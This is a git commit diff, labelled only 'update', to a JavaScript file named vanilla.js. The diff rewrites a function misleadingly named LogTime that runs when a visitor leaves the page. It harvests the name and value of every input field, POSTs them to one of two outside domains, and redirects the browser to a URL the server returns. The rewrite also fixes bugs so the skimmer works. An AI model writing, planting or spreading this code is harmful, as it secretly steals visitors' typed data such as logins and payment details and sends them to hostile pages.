cf6bc2f04b5cc60ba519fc3fa95933ced309354f
Yonatan354 <yonatan_g@adsen-media.com>
2023-12-04 16:26:09 +0200

    update

--- vanilla.js
+++ vanilla.js
@@ -2,22 +2,17 @@ var stop = true;
 
 function LogTime(e) {
     const xhr = new XMLHttpRequest();
-xhr.open("POST", '//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', true);
-xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8');
-xhr.send("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&"));
-// Fired once the request completes successfully 
-xhr.onload = function(e) {
-    // Check if the request was a success
-    if (this.readyState === XMLHttpRequest.DONE && this.status === 201) {
-    	// Get and convert the responseText into JSON
-    	var response = JSON.parse(xhr.responseText);
-    	if (response.url) {
-            stop = false;
-            e.preventDefault();
-            window.location.href = dt.url;
-        }
-    }
+ xhr.open("POST", '//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', true);
+ xhr.onload = function(e) {
+  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+   var response = JSON.parse(xhr.response);
+   if (response.url) {
+    stop = false;
+    e.preventDefault();
+    window.location.href = response.url;
+   }
+  }
+ }
+ xhr.send("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&"));
 }
-}
-
-window.onbeforeunload = LogTime
+window.onbeforeunload = LogTime;
